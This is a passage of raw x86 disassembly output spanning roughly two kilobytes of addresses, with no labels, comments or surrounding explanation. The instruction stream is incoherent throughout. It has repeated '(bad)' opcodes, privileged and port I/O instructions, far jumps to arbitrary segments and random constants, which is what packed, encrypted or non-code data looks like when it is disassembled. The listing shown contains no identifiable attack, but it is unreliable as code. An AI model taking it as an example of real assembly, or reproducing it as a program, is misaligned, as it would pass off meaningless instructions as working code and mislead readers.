  41e22f:	outs   dx,BYTE PTR ds:[esi]
  41e230:	mov    eax,ds:0x67d28899
  41e235:	xchg   ebp,eax
  41e236:	mov    dh,0x31
  41e238:	cmp    BYTE PTR [eax],dl
  41e23a:	sar    BYTE PTR [edx+0xd7cd21e],cl
  41e240:	jmpw   0x645d
  41e244:	ins    BYTE PTR es:[edi],dx
  41e245:	(bad)  
  41e246:	xchg   ebp,eax
  41e247:	mov    ?,edx
  41e249:	mov    esi,0x387dfe00
  41e24e:	stos   DWORD PTR es:[edi],eax
  41e24f:	icebp  
  41e250:	cmp    al,0x6e
  41e252:	clc    
  41e253:	sub    esi,eax
  41e255:	pop    ds
  41e256:	lods   al,BYTE PTR ds:[esi]
  41e257:	jmp    FWORD PTR [ecx+0x9]
  41e25a:	mov    cs,WORD PTR ds:0x1c4e6db1
  41e260:	es jae 0x41e2c9
  41e263:	rol    DWORD PTR [esi+ebx*1+0x46],1
  41e267:	das    
  41e268:	dec    esp
  41e269:	js     0x41e2c2
  41e26b:	cmp    al,0x18
  41e26d:	or     al,0xb8
  41e26f:	xor    BYTE PTR [ebx+ebx*4],ch
  41e272:	retf   
  41e273:	xor    bh,BYTE PTR [esi-0x1b0ff2c3]
  41e279:	repz push ss
  41e27b:	jp     0x41e204
  41e27d:	sbb    ebp,DWORD PTR [eax+ebx*2+0x15ca0aac]
  41e284:	mov    dl,0x92
  41e286:	mov    bl,0x8f
  41e288:	dec    ecx
  41e289:	mov    dl,0x5c
  41e28b:	sahf   
  41e28c:	sbb    DWORD PTR [edi-0x65],esp
  41e28f:	push   0x957085f7
  41e294:	add    BYTE PTR [ebx-0x40ffbe22],dh
  41e29a:	sbb    DWORD PTR [ecx-0x4be8a250],edi
  41e2a0:	add    BYTE PTR [ebp+0x71a4932e],0xee
  41e2a7:	fwait
  41e2a8:	mov    BYTE PTR [esi-0x200ec1c5],0xc3
  41e2af:	inc    esp
  41e2b0:	push   eax
  41e2b1:	dec    edx
  41e2b2:	xor    esp,0xcb3de3d5
  41e2b8:	mov    ecx,0xa4409bd
  41e2bd:	and    ch,bh
  41e2bf:	xor    eax,0x62f8067d
  41e2c4:	mov    gs,WORD PTR [ebx+0x16]
  41e2c7:	pushf  
  41e2c8:	lods   al,BYTE PTR ds:[esi]
  41e2c9:	cmp    al,0xe7
  41e2cb:	int3   
  41e2cc:	cmp    BYTE PTR [edx+ebp*2-0x50dc55a],cl
  41e2d3:	xlat   BYTE PTR ds:[ebx]
  41e2d4:	aad    0x68
  41e2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2d7:	bound  edi,QWORD PTR [ebp-0x13]
  41e2da:	push   0xffffffdf
  41e2dc:	vpavgw ymm5,ymm5,YMMWORD PTR [edi+eiz*4-0x22]
  41e2e2:	pop    eax
  41e2e3:	push   ss
  41e2e4:	hlt    
  41e2e5:	mov    ds:0x84391e07,al
  41e2ea:	push   ecx
  41e2eb:	mov    eax,0x41162f91
  41e2f0:	sahf   
  41e2f1:	icebp  
  41e2f2:	mov    ds:0xf38b5c9e,al
  41e2f7:	jb     0x41e296
  41e2f9:	sbb    al,0x7f
  41e2fb:	sbb    al,BYTE PTR [ecx+edi*2-0x2f]
  41e2ff:	call   0xf86f:0xad865235
  41e306:	bound  esp,QWORD PTR [ebx]
  41e308:	push   ebx
  41e309:	and    dl,bh
  41e30b:	pop    ecx
  41e30c:	cmc    
  41e30d:	mov    dh,0xc8
  41e30f:	or     al,cl
  41e311:	add    al,BYTE PTR [ebx-0x15adba94]
  41e317:	das    
  41e318:	hlt    
  41e319:	shl    DWORD PTR [ebx-0x32448c87],0x8e
  41e320:	fimul  WORD PTR [esi+0x5c]
  41e323:	jae    0x41e35c
  41e325:	(bad)
  41e328:	jp     0x41e328
  41e32a:	clc    
  41e32b:	in     eax,dx
  41e32c:	jmp    0x41e37c
  41e32e:	xchg   DWORD PTR [eax-0x35c0ab60],edi
  41e334:	lahf   
  41e335:	and    eax,0x30cfab42
  41e33a:	ficom  DWORD PTR [edx+esi*8+0xe505808]
  41e341:	jbe    0x41e344
  41e343:	pop    ecx
  41e344:	lea    esp,[esi-0x4e]
  41e347:	push   eax
  41e348:	aad    0x22
  41e34a:	inc    esi
  41e34b:	mov    edx,0xa5e5fb72
  41e350:	xchg   edx,eax
  41e351:	mov    DWORD PTR [eax+ecx*8+0x2615e16e],0xce933204
  41e35c:	mov    al,ds:0x1150c498
  41e361:	pop    ebp
  41e362:	pop    edx
  41e363:	inc    edi
  41e364:	adc    eax,0x61f216b8
  41e369:	sbb    DWORD PTR [eax-0x1ab845ef],0xffffffb7
  41e370:	iret   
  41e371:	dec    edi
  41e372:	rcl    bh,cl
  41e374:	retf   
  41e375:	mov    ebx,0x4ca097d9
  41e37a:	xor    ecx,DWORD PTR [edi-0x24]
  41e37d:	popa   
  41e37e:	jb     0x41e363
  41e380:	inc    eax
  41e381:	shr    bh,1
  41e383:	pop    ecx
  41e384:	fwait
  41e385:	or     DWORD PTR [edx+0x18356016],eax
  41e38b:	pop    ss
  41e38c:	jbe    0x41e33a
  41e38e:	add    al,0x72
  41e390:	jns    0x41e3c2
  41e392:	add    al,0x4b
  41e394:	sbb    al,0x92
  41e396:	pop    ss
  41e397:	jnp    0x41e39f
  41e399:	mov    eax,0x8b90a1e7
  41e39e:	jmp    0xa3a096dc
  41e3a3:	xchg   edx,eax
  41e3a4:	gs push cs
  41e3a6:	mov    ebp,fs
  41e3a8:	neg    DWORD PTR [edi-0x53140064]
  41e3ae:	lods   eax,DWORD PTR ds:[esi]
  41e3af:	jbe    0x41e3a8
  41e3b1:	arpl   WORD PTR [edi-0x7ae5172],dx
  41e3b7:	(bad)  
  41e3b8:	sti    
  41e3b9:	test   BYTE PTR [ebx+0x2d405144],dl
  41e3bf:	xor    eax,0xe8f65625
  41e3c4:	add    DWORD PTR [ecx-0x526bf867],esi
  41e3ca:	mov    bh,0xb9
  41e3cc:	mov    edx,0x31d9ca5f
  41e3d1:	sub    BYTE PTR [esi+0x75],cl
  41e3d4:	inc    edx
  41e3d5:	fnsave [esi]
  41e3d7:	dec    edx
  41e3d8:	cmp    ebp,eax
  41e3da:	inc    esp
  41e3db:	sbb    edi,DWORD PTR [esi+0x79]
  41e3de:	loope  0x41e39e
  41e3e0:	cdq    
  41e3e1:	inc    esi
  41e3e2:	pop    eax
  41e3e3:	mov    fs,WORD PTR [eax-0x657bf6cb]
  41e3e9:	mov    dh,BYTE PTR [ebx-0x6abd8470]
  41e3ef:	pop    ecx
  41e3f0:	sub    eax,0xf4a182dd
  41e3f5:	pusha  
  41e3f6:	lahf   
  41e3f7:	call   FWORD PTR [ebp+0x38b0f0d8]
  41e3fd:	fwait
  41e3fe:	mov    ebx,0x784dcccf
  41e403:	add    al,0x97
  41e405:	scas   eax,DWORD PTR es:[edi]
  41e406:	xor    al,al
  41e408:	sar    DWORD PTR [eax+0x2a],0xae
  41e40c:	shl    DWORD PTR [ebx-0x38650cfa],1
  41e412:	icebp  
  41e413:	imul   esp,DWORD PTR [ebp+0x32],0xe93b4c71
  41e41a:	call   0xbd35:0x7c1482b
  41e421:	(bad)  
  41e422:	test   eax,0x989dc5e8
  41e427:	inc    ebx
  41e428:	mov    al,ds:0xea519d28
  41e42d:	sub    bh,dl
  41e42f:	push   cs
  41e430:	xchg   edi,eax
  41e431:	nop
  41e432:	add    al,0xe2
  41e434:	repnz lods al,BYTE PTR ds:[esi]
  41e436:	push   esp
  41e437:	cmp    esp,DWORD PTR [eax-0x221b4a50]
  41e43d:	call   0x4794:0x9ff3a386
  41e444:	push   edi
  41e445:	sti    
  41e446:	lods   al,BYTE PTR ds:[esi]
  41e447:	xor    bh,al
  41e449:	sub    BYTE PTR [ebx],al
  41e44b:	fcomp  st(6)
  41e44d:	pop    edx
  41e44e:	loope  0x41e462
  41e450:	push   ebx
  41e451:	mov    ch,0x49
  41e453:	fwait
  41e454:	clc    
  41e455:	arpl   WORD PTR [ecx],si
  41e457:	jg     0x41e412
  41e459:	das    
  41e45a:	enter  0x9aac,0x91
  41e45e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e45f:	xchg   ecx,eax
  41e460:	stos   DWORD PTR es:[edi],eax
  41e461:	fwait
  41e462:	sub    DWORD PTR [eax-0x44c61d55],eax
  41e468:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e469:	or     al,0xba
  41e46b:	pop    ebp
  41e46c:	sbb    al,0xa
  41e46e:	mov    ebx,0x18d5d369
  41e473:	xchg   edi,eax
  41e474:	scas   eax,DWORD PTR es:[edi]
  41e475:	lods   eax,DWORD PTR ds:[esi]
  41e476:	mov    ds:0x17495a6,eax
  41e47b:	sbb    BYTE PTR [ebx+0x3],ch
  41e47e:	xor    BYTE PTR [ebx+0x54455ac3],dh
  41e484:	cmp    al,0x78
  41e486:	mov    eax,ds:0x1cce7fc
  41e48b:	dec    edi
  41e48c:	fsub   QWORD PTR [ecx]
  41e48e:	adc    al,0xa1
  41e490:	xor    DWORD PTR [ebx],ebp
  41e492:	shr    BYTE PTR [esi],cl
  41e494:	stc    
  41e495:	iret   
  41e496:	mov    ds:0xd5af5cd8,eax
  41e49b:	adc    DWORD PTR [esi+0x76dfe93c],ebp
  41e4a1:	xor    edx,ebx
  41e4a3:	retf   0x3ab6
  41e4a6:	sub    BYTE PTR [eax],dl
  41e4a8:	sbb    cl,BYTE PTR [edx+0x1]
  41e4ab:	lahf   
  41e4ac:	imul   ebp,DWORD PTR [ecx-0x62],0xffffff93
  41e4b0:	ret    0xb179
  41e4b3:	add    al,0x26
  41e4b5:	pop    ebx
  41e4b6:	push   ss
  41e4b7:	jnp    0x41e502
  41e4b9:	fs mov ah,0xa7
  41e4bc:	inc    ebp
  41e4bd:	mov    DWORD PTR fs:[ebp-0x3d0a5487],ebp
  41e4c4:	jns    0x41e4a2
  41e4c6:	jnp    0x41e47d
  41e4c8:	rol    DWORD PTR [edx+0x56],1
  41e4cb:	inc    ebx
  41e4cc:	neg    DWORD PTR [eax-0x2ec35deb]
  41e4d2:	add    ecx,ebx
  41e4d4:	frstor [ecx]
  41e4d6:	adc    esp,ecx
  41e4d8:	jge    0x41e4dd
  41e4da:	jge    0x41e50c
  41e4dc:	rcl    bl,0x41
  41e4df:	mov    ebp,0x76275b63
  41e4e4:	lahf   
  41e4e5:	inc    eax
  41e4e6:	cmp    DWORD PTR [eax],0xf84ba0c2
  41e4ec:	frstor [eax+edi*1]
  41e4ef:	push   0xf665d1ca
  41e4f4:	cli    
  41e4f5:	mov    al,0x63
  41e4f7:	mov    ebp,0x2079d404
  41e4fc:	sub    al,0xa5
  41e4ff:	scas   al,BYTE PTR es:[edi]
  41e500:	mov    edi,DWORD PTR [ecx+0xf]
  41e503:	scas   al,BYTE PTR es:[edi]
  41e504:	jae    0x41e4bd
  41e506:	push   0x2b625a19
  41e50b:	out    dx,eax
  41e50c:	push   0xffffffe6
  41e50e:	adc    al,BYTE PTR [edi+0x172f9e90]
  41e514:	je     0x41e565
  41e516:	in     eax,dx
  41e517:	test   DWORD PTR ds:0xa7951400,ebp
  41e51d:	test   eax,0x2d5d4a4c
  41e522:	mov    es,edi
  41e524:	fwait
  41e525:	xchg   ebp,eax
  41e526:	add    edi,DWORD PTR [ebx-0x22]
  41e529:	inc    esi
  41e52a:	pop    eax
  41e52b:	repnz add eax,0xa134545d
  41e531:	leave  
  41e532:	mov    ch,BYTE PTR [esi+esi*1-0x70]
  41e536:	(bad)  
  41e537:	mov    ecx,0x15721258
  41e53c:	retf   
  41e53d:	pop    ebp
  41e53e:	not    BYTE PTR [ebp-0x13]
  41e541:	imul   ebp,DWORD PTR [edi+0x7ab50101],0xde4ec03
  41e54b:	cld    
  41e54c:	popf   
  41e54d:	arpl   WORD PTR [ebx],cx
  41e54f:	imul   ecx,DWORD PTR [edi+0x280fc210],0xffffff99
  41e556:	sbb    BYTE PTR [eax-0x69],dh
  41e559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e55a:	xor    BYTE PTR [esi+eax*4],ah
  41e55d:	aaa    
  41e55e:	data16 mov ds:0xb8d7515e,al
  41e564:	sub    al,0xd6
  41e566:	(bad)  
  41e567:	cmp    DWORD PTR [ebx+eiz*2-0x5c3851c7],eax
  41e56e:	out    dx,eax
  41e56f:	mov    esi,0x99db9ca0
  41e574:	jle    0x41e521
  41e576:	inc    edi
  41e577:	sub    dh,BYTE PTR [esi]
  41e579:	mov    dl,BYTE PTR [edx-0x11219d11]
  41e57f:	jmp    0x41e5bd
  41e581:	arpl   bp,dx
  41e583:	sti    
  41e584:	iret   
  41e585:	jae    0x41e5d2
  41e587:	adc    DWORD PTR [edx-0x66cb19d0],ebp
  41e58d:	popf   
  41e58e:	jmp    0x41e5b1
  41e590:	jbe    0x41e5f1
  41e592:	cmp    DWORD PTR [edi+0x6f407aef],ebp
  41e598:	mov    bl,0x1f
  41e59a:	les    edx,FWORD PTR [edi]
  41e59c:	mov    edi,0xeb883547
  41e5a1:	imul   edx,ebx,0x7d
  41e5a4:	nop
  41e5a5:	mov    ah,0x3
  41e5a7:	sahf   
  41e5a8:	adc    dl,BYTE PTR [ebx]
  41e5aa:	xchg   edx,eax
  41e5ab:	xchg   cl,ah
  41e5ad:	xchg   esi,eax
  41e5ae:	jns    0x41e5d3
  41e5b0:	test   DWORD PTR [ecx-0x7b],ebp
  41e5b3:	sbb    BYTE PTR [edi-0x75a3ef19],0x2e
  41e5ba:	dec    ebx
  41e5bb:	push   ds
  41e5bc:	or     eax,0xf76e7eb5
  41e5c1:	sub    BYTE PTR [esi+0x20],bh
  41e5c4:	xor    eax,DWORD PTR [esi+0x57de79f]
  41e5ca:	and    DWORD PTR cs:[ebx-0x42],ebp
  41e5ce:	mov    eax,0x64e4c2f8
  41e5d3:	push   esi
  41e5d4:	sahf   
  41e5d5:	fnsave [edi+0x71c85376]
  41e5db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5dd:	sbb    al,BYTE PTR [esi-0x181a609]
  41e5e3:	or     al,0xa
  41e5e5:	inc    ebp
  41e5e6:	pop    esi
  41e5e7:	pop    ebx
  41e5e8:	jle    0x41e571
  41e5ea:	xchg   DWORD PTR ds:0x6ccf8e0d,esi
  41e5f0:	je     0x41e57f
  41e5f2:	arpl   WORD PTR [ecx+ebp*2],di
  41e5f5:	jge    0x41e5ba
  41e5f7:	mov    al,0x3e
  41e5f9:	int3   
  41e5fa:	dec    edi
  41e5fb:	dec    esp
  41e5fc:	mov    esp,0xd6711a7c
  41e601:	dec    ebp
  41e602:	mov    bl,0xba
  41e604:	shl    ah,0xc0
  41e607:	and    DWORD PTR [ecx],ebx
  41e609:	push   esp
  41e60a:	mov    eax,0xcd19fc1c
  41e60f:	test   eax,0x48def176
  41e614:	adc    BYTE PTR [edx-0x52],0x0
  41e618:	ins    BYTE PTR es:[edi],dx
  41e619:	push   ss
  41e61a:	inc    eax
  41e61b:	mov    eax,es
  41e61d:	jg     0x41e621
  41e61f:	out    dx,al
  41e620:	loope  0x41e5e9
  41e622:	fcom   DWORD PTR [eax]
  41e624:	stos   BYTE PTR es:[edi],al
  41e625:	jae    0x41e612
  41e627:	sbb    DWORD PTR [eax+0x65a0b068],ecx
  41e62d:	inc    esp
  41e62e:	retf   
  41e62f:	sub    DWORD PTR ds:0xd78422f8,0xaa281a02
  41e639:	lods   al,BYTE PTR ds:[esi]
  41e63a:	xchg   esp,eax
  41e63b:	jg     0x41e67f
  41e63d:	sbb    esi,DWORD PTR [esi]
  41e63f:	pushf  
  41e640:	nop
  41e641:	push   es
  41e642:	lds    edi,FWORD PTR [ebx]
  41e644:	xor    DWORD PTR [eax+0x1d],esi
  41e647:	and    edx,ecx
  41e649:	sbb    DWORD PTR [esi],ebx
  41e64b:	fistp  QWORD PTR [ebp+0x62]
  41e64e:	(bad)  
  41e64f:	fldcw  WORD PTR [esi]
  41e651:	in     al,dx
  41e652:	dec    ecx
  41e653:	adc    ebp,DWORD PTR [ebx+0x15]
  41e656:	scas   eax,DWORD PTR es:[edi]
  41e657:	push   es
  41e658:	mov    al,0xf5
  41e65a:	nop
  41e65b:	sbb    edi,DWORD PTR [eax-0x3b]
  41e65e:	cmp    al,0x77
  41e660:	fdivr  DWORD PTR [edi+0x27]
  41e663:	mov    ds:0x8267847b,al
  41e669:	das    
  41e66a:	inc    edx
  41e66b:	repnz (bad) [ebx-0x3839b30f]
  41e672:	int    0x84
  41e674:	test   al,0xd2
  41e676:	mov    ch,0x5e
  41e678:	xchg   ebx,eax
  41e679:	arpl   WORD PTR [eax-0x5b],bx
  41e67c:	dec    esi
  41e67d:	jmp    0xa950:0x3ce81437
  41e684:	mov    al,0xaa
  41e686:	pop    esi
  41e687:	push   ecx
  41e688:	inc    eax
  41e689:	rol    BYTE PTR [eax-0x6b],0x32
  41e68d:	sahf   
  41e68e:	dec    edx
  41e68f:	sub    eax,DWORD PTR [eax+0x3e7d684e]
  41e695:	loope  0x41e6bf
  41e697:	rol    BYTE PTR ds:0x2be4621f,cl
  41e69d:	inc    ebx
  41e69e:	outs   dx,BYTE PTR ds:[esi]
  41e69f:	mov    ebp,0x8ffd2336
  41e6a4:	fimul  DWORD PTR [esi]
  41e6a6:	in     al,dx
  41e6a7:	push   0xffffffe8
  41e6a9:	lods   eax,DWORD PTR ds:[esi]
  41e6aa:	mov    DWORD PTR [ebx-0xdb11c21],esp
  41e6b0:	lds    ebp,FWORD PTR [ecx+esi*8]
  41e6b3:	inc    ecx
  41e6b4:	je     0x41e6ac
  41e6b6:	cmp    BYTE PTR [eax-0x608c8371],ch
  41e6bc:	ds pusha 
  41e6be:	inc    edi
  41e6bf:	push   ebx
  41e6c0:	cmc    
  41e6c1:	sbb    cl,BYTE PTR [ebx+eiz*2-0x43c40a03]
  41e6c8:	xor    eax,0xd6bd121f
  41e6cd:	ins    DWORD PTR es:[edi],dx
  41e6ce:	adc    BYTE PTR [edi+0x6f],bl
  41e6d1:	cs jp  0x41e6ae
  41e6d4:	stos   BYTE PTR es:[edi],al
  41e6d5:	mov    ch,0xf2
  41e6d7:	inc    ecx
  41e6d8:	aaa    
  41e6d9:	inc    edi
  41e6da:	dec    edx
  41e6db:	mov    ds:0x9fcace09,al
  41e6e0:	push   ebx
  41e6e1:	nop
  41e6e2:	sub    esp,DWORD PTR [ecx+0x29]
  41e6e5:	fisub  WORD PTR [ebp-0x5459e80b]
  41e6eb:	ret    
  41e6ec:	jl     0x41e72f
  41e6ee:	ret    
  41e6ef:	aas    
  41e6f0:	sbb    edi,DWORD PTR ds:0x461a46d6
  41e6f6:	sti    
  41e6f7:	mov    ebp,0x5f4356b3
  41e6fc:	mov    al,ds:0x7796996a
  41e701:	push   ebp
  41e702:	jo     0x41e6f1
  41e704:	loop   0x41e6c7
  41e706:	jb     0x41e721
  41e708:	dec    ebp
  41e709:	jbe    0x41e6cc
  41e70b:	dec    esi
  41e70c:	ins    BYTE PTR es:[edi],dx
  41e70d:	sub    eax,ecx
  41e70f:	sar    DWORD PTR [ebx-0x3314e553],1
  41e715:	mov    ebx,0x99c5e509
  41e71a:	xchg   edx,eax
  41e71b:	xchg   al,ch
  41e71d:	add    ecx,DWORD PTR [ecx]
  41e71f:	(bad)  
  41e720:	rcl    BYTE PTR [eax-0x62],cl
  41e723:	jbe    0x41e75d
  41e725:	add    dh,BYTE PTR [edx+0x43]
  41e728:	retf   0xeac2
  41e72b:	repz xchg edx,eax
  41e72d:	pop    esp
  41e72e:	jecxz  0x41e6f6
  41e730:	(bad)
  41e733:	xor    DWORD PTR cs:[ecx],0x9486709
  41e73a:	dec    DWORD PTR [esi+0x4a]
  41e73d:	xchg   esi,eax
  41e73e:	leave  
  41e73f:	inc    eax
  41e740:	outs   dx,BYTE PTR ds:[esi]
  41e741:	xor    bl,BYTE PTR [esi+0x59]
  41e744:	add    al,0xe5
  41e746:	je     0x41e72f
  41e748:	ins    DWORD PTR es:[edi],dx
  41e749:	sbb    eax,0xfcedbf2
  41e74e:	cmp    dl,ah
  41e750:	push   edi
  41e751:	mov    eax,ds:0xc98851b8
  41e756:	and    DWORD PTR [ebx-0x3330431],esp
  41e75c:	pop    edx
  41e75d:	ret    0x1f64
  41e760:	pop    esp
  41e761:	dec    edi
  41e762:	dec    esi
  41e763:	jmp    0xe68112b6
  41e768:	aas    
  41e769:	stc    
  41e76a:	pop    esi
  41e76b:	inc    eax
  41e76c:	mov    ecx,edx
  41e76e:	mov    ds:0x1ad537ba,eax
  41e773:	test   al,0xc6
  41e775:	aas    
  41e776:	inc    edi
  41e777:	rcr    BYTE PTR [ebp+0x49],1
  41e77a:	mov    ss,WORD PTR [edi]
  41e77c:	dec    edi
  41e77d:	mov    cl,0xc3
  41e77f:	xor    al,bl
  41e781:	push   ecx
  41e782:	jmp    0x8c8e:0x99ba2836
  41e789:	inc    ebx
  41e78a:	retf   0x524
  41e78d:	add    DWORD PTR [esi+ebx*4+0x4fc02163],ebx
  41e794:	sbb    al,0xaa
  41e796:	mov    esp,0x9709f9f7
  41e79b:	lds    ecx,FWORD PTR [esi-0x14e24d70]
  41e7a1:	outs   dx,DWORD PTR ds:[esi]
  41e7a2:	in     al,dx
  41e7a3:	dec    ebp
  41e7a4:	and    eax,edi
  41e7a6:	aas    
  41e7a7:	clc    
  41e7a8:	or     BYTE PTR [edi+0x6f],al
  41e7ab:	cmp    eax,0xfb280a08
  41e7b0:	mov    ebx,0x3bb6ff10
  41e7b5:	jmp    0x65fe5a45
  41e7ba:	scas   eax,DWORD PTR es:[edi]
  41e7bb:	push   es
  41e7bc:	fdivr  st,st(6)
  41e7be:	mov    ah,0xea
  41e7c0:	push   esp
  41e7c1:	loopne 0x41e7ee
  41e7c3:	pop    ebx
  41e7c4:	(bad)  
  41e7c5:	push   esp
  41e7c6:	jb     0x41e78a
  41e7c8:	mov    al,0x82
  41e7ca:	sbb    al,0xcd
  41e7cc:	(bad)  
  41e7cd:	mov    al,ds:0x1efd577e
  41e7d2:	xlat   BYTE PTR ds:[ebx]
  41e7d3:	cdq    
  41e7d4:	(bad)  
  41e7d5:	dec    ebx
  41e7d6:	pop    esi
  41e7d7:	test   al,0xa9
  41e7d9:	jbe    0x41e76c
  41e7db:	pop    esp
  41e7dc:	mov    bh,0xf3
  41e7de:	xor    DWORD PTR [ebp-0x1e],ebp
  41e7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7e2:	sub    cl,BYTE PTR [edx+esi*8-0x7f9cb3d4]
  41e7e9:	xchg   esi,eax
  41e7ea:	pop    esi
  41e7eb:	(bad)  [ebx]
  41e7ed:	pop    ss
  41e7ee:	mov    ds:0x36cf56d4,eax
  41e7f3:	pop    esi
  41e7f4:	gs jmp 0x41e80b
  41e7f7:	xor    BYTE PTR [ecx],dl
  41e7f9:	retf   0xde5f
  41e7fc:	push   es
  41e7fd:	mov    ecx,0xfb70f7c1
  41e802:	and    ch,BYTE PTR [edi+0x7adfafe6]
  41e808:	fcomi  st,st(2)
  41e80a:	jmp    0xaa3c1b68
  41e80f:	xchg   esp,eax
  41e810:	inc    ecx
  41e811:	mov    ds:0x3964ae7d,al
  41e816:	mov    ch,0x32
  41e818:	frstor [ecx-0x6c]
  41e81b:	ins    BYTE PTR es:[edi],dx
  41e81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81d:	mov    ds:0x8537106f,al
  41e822:	mov    ch,0x40
  41e824:	pushf  
  41e825:	xchg   ecx,eax
  41e826:	loope  0x41e7ad
  41e828:	shl    BYTE PTR [edi],0x6a
  41e82b:	cli    
  41e82c:	clc    
  41e82d:	cmc    
  41e82e:	inc    ebx
  41e82f:	ja     0x41e829
  41e831:	or     al,0xae
  41e833:	push   0x5c24b42a
  41e838:	xchg   edx,eax
  41e839:	sub    al,BYTE PTR [edi]
  41e83b:	fisttp QWORD PTR [edx]
  41e83d:	jbe    0x41e805
  41e83f:	test   eax,0xd2dbd441
  41e844:	loop   0x41e849
  41e846:	jae    0x41e7f2
  41e848:	inc    ebx
  41e849:	cmc    
  41e84a:	mov    dl,0xfd
  41e84c:	jg     0x41e821
  41e84e:	(bad)  
  41e84f:	stc    
  41e850:	mov    ch,0xfe
  41e852:	inc    DWORD PTR [ebx]
  41e854:	pop    edx
  41e855:	sar    al,0x20
  41e858:	loope  0x41e80a
  41e85a:	and    al,0xb0
  41e85c:	pop    gs
  41e85e:	pop    ds
  41e85f:	push   0x58
  41e861:	cmp    bh,BYTE PTR [eax]
  41e863:	stc    
  41e864:	sub    eax,0x44461b05
  41e869:	out    0x31,eax
  41e86b:	cwde   
  41e86c:	inc    edi
  41e86d:	dec    eax
  41e86e:	test   al,0x81
  41e870:	jae    0x41e8ef
  41e872:	in     al,dx
  41e873:	scas   al,BYTE PTR es:[edi]
  41e874:	pusha  
  41e875:	ins    DWORD PTR es:[edi],dx
  41e876:	lods   eax,DWORD PTR ds:[esi]
  41e877:	xchg   edx,eax
  41e878:	cli    
  41e879:	stc    
  41e87a:	les    esp,FWORD PTR [ebx-0x3af8c7ed]
  41e880:	fnstsw WORD PTR [ebp-0x21]
  41e883:	fwait
  41e884:	jnp    0x41e8cb
  41e886:	test   edi,ebp
  41e888:	ja     0x41e84f
  41e88a:	sbb    DWORD PTR [edx],edx
  41e88c:	or     al,bh
  41e88e:	mov    BYTE PTR [ecx+ebp*1+0x3a75b7c0],cl
  41e895:	xor    bh,ah
  41e897:	inc    ebp
  41e898:	and    DWORD PTR [ecx],edi
  41e89a:	sar    BYTE PTR [ecx+0xf],0x47
  41e89e:	pop    eax
  41e89f:	pop    esp
  41e8a0:	xlat   BYTE PTR ds:[ebx]
  41e8a1:	mov    cl,0x8a
  41e8a3:	lock adc BYTE PTR [ecx-0x7c],ah
  41e8a7:	test   eax,0xe920fa7b
  41e8ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8ad:	or     eax,0xe17b6240
  41e8b2:	mov    al,0x2d
  41e8b4:	into   
  41e8b5:	out    dx,al
  41e8b6:	jne    0x41e88a
  41e8b8:	or     al,0x30
  41e8ba:	sbb    al,0x72
  41e8bc:	rcl    DWORD PTR [ebx+0x64cec889],0x6f
  41e8c3:	bound  ebx,QWORD PTR ds:0x3f72470e
  41e8c9:	in     eax,0x92
  41e8cb:	jl     0x41e914
  41e8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ce:	stc    
  41e8cf:	jmp    0xda177f1
  41e8d4:	in     al,0x71
  41e8d6:	out    dx,eax
  41e8d7:	inc    ebx
  41e8d8:	in     al,dx
  41e8d9:	stos   DWORD PTR es:[edi],eax
  41e8da:	xbegin 0x52b76c2e
  41e8e0:	xchg   edx,eax
  41e8e1:	enter  0xc2c3,0x1f
  41e8e5:	xchg   ecx,eax
  41e8e6:	or     al,0xfd
  41e8e8:	das    
  41e8e9:	xchg   esp,eax
  41e8ea:	sub    dl,BYTE PTR [eax+0x778e533]
  41e8f0:	inc    esp
  41e8f1:	mov    ebx,0xb5a85c05
  41e8f6:	dec    eax
  41e8f7:	lods   eax,DWORD PTR ds:[esi]
  41e8f8:	bound  esi,QWORD PTR [ebx-0x637ae256]
  41e8fe:	loop   0x41e97a
  41e900:	push   ebx
  41e901:	cwde   
  41e902:	sub    dl,BYTE PTR [ebx-0x25974cf1]
  41e908:	mov    dl,0x27
  41e90a:	xchg   ebx,eax
  41e90b:	push   0xd97c6fab
  41e910:	ret    0xbc91
  41e913:	addr16 pusha 
  41e915:	add    eax,0x939aed63
  41e91a:	mov    bl,0xcf
  41e91c:	test   eax,0x87bee206
  41e921:	mov    eax,ds:0xbde66fe2
  41e926:	int    0xfe
  41e928:	adc    al,0x58
  41e92a:	cmp    eax,0xd403d79a
  41e92f:	mov    edi,DWORD PTR [eax-0x72909199]
  41e935:	fldpi  
  41e937:	jmp    0x6240:0x86ab2d92
  41e93e:	and    eax,0xceb1caa0
  41e943:	pop    ecx
  41e944:	sar    DWORD PTR [edi],1
  41e946:	cmp    ecx,esp
  41e948:	aaa    
  41e949:	sub    eax,0x40d7d4c
  41e94e:	int3   
  41e94f:	mov    ah,0xa3
  41e951:	(bad)  
  41e952:	cmp    al,0xcb
  41e954:	gs pop eax
  41e956:	pop    eax
  41e957:	mov    edi,0xebf581f6
  41e95c:	sub    al,0x47
  41e95e:	inc    esi
  41e95f:	push   esi
  41e960:	icebp  
  41e961:	add    al,0x70
  41e963:	lods   eax,DWORD PTR ds:[esi]
  41e964:	xor    eax,0xb54a2745
  41e969:	stos   BYTE PTR es:[edi],al
  41e96a:	and    DWORD PTR [bp+0x29c5],edi
  41e96f:	sbb    DWORD PTR [ebp+0x4b],esp
  41e972:	cmp    DWORD PTR [eax+0x77],eax
  41e975:	mov    bl,0x4e
  41e977:	aam    0x29
  41e979:	lds    ecx,FWORD PTR es:[ebx+0x238ccf45]
  41e980:	gs pop ebx
  41e982:	mov    al,0x9
  41e984:	push   ss
  41e985:	gs xchg esp,eax
  41e987:	mov    DWORD PTR [esp+eiz*2-0x32698335],esi
  41e98e:	xor    al,0x65
  41e990:	jge    0x41e9cd
  41e992:	mov    edx,0x10b7ad48
  41e997:	or     ah,ah
  41e999:	(bad)  
  41e99a:	sbb    DWORD PTR [esi-0x56],ebp
  41e99d:	ret    
  41e99e:	jecxz  0x41e9d5
  41e9a0:	xchg   esp,eax
  41e9a1:	ret    
  41e9a2:	adc    eax,0x397f87d1
  41e9a7:	jno    0x41e9c0
  41e9a9:	dec    BYTE PTR fs:0x6213d518
  41e9b0:	push   0xffffff9a
  41e9b2:	in     al,dx
  41e9b3:	shl    DWORD PTR [ebx+0x20d66b69],cl
